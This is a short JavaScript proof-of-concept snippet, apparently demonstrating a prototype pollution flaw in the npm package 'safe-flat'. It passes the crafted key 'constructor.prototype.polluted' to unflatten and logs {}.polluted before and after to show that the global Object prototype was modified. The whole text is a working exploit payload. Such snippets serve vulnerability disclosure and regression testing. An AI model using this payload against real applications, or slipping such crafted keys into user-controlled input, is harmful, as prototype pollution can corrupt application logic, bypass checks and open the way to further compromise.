var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var safeFlat = require('safe-flat');
obj = {};
console.log({}.polluted);
safeFlat.unflatten({ 'constructor.prototype.polluted': 'yes' }, '.');
console.log({}.polluted);